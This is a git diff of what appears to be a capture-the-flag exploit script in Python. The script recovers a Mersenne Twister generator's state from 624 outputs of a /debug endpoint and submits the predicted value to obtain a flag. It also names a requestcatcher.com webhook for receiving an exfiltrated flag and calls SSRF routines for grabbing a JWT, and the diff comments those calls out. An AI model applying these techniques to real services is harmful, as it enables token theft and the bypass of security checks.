@@ -1,6 +1,7 @@
 import httpx
 from mt19937predictor import MT19937Predictor
 
+# URL = "http://77.37.47.226:1811"
 URL = "http://localhost:1811"
 
 WEBHOOK = "https://demoaja.requestcatcher.com/get_flag_enc?c="
@@ -44,18 +45,22 @@ class BaseAPI:
             })
         print(r.text)
         
-    def get_flag(self):
+    def get_flag(self,md5flag=ENC_FLAG):
         predictor = MT19937Predictor()
 
         for i in range(624):
             print('iteration : ', i)
             x = self.c.get('/debug?debug=1')
             predictor.setrandbits(int(x.json()['hash']), 32) 
+        predicted = predictor.getrandbits(32)
+        print('predict : ', predicted)
         r = self.c.get('/debug', params={
-            'hash':predictor.getrandbits(32),
-            'flag':ENC_FLAG
+            'hash':predicted,
+            'flag':md5flag
         })
         print(r.text)
+        
+
         
 class API(BaseAPI):
     ...
@@ -63,6 +68,9 @@ class API(BaseAPI):
 if __name__ == "__main__":
     api = API()
     # api.get_flag()
-    api.ssrf_and_get_jwt_by_requests()
-    api.ssrf_and_get_jwt_by_hosts()
-    api.submit()
+    # api.ssrf_and_get_jwt_by_requests()
+    # api.ssrf_and_get_jwt_by_hosts()
+    # api.submit()
+    # enc_flag = input('input md5 flag: ')
+    # api.get_flag(enc_flag)
+    api.get_flag()
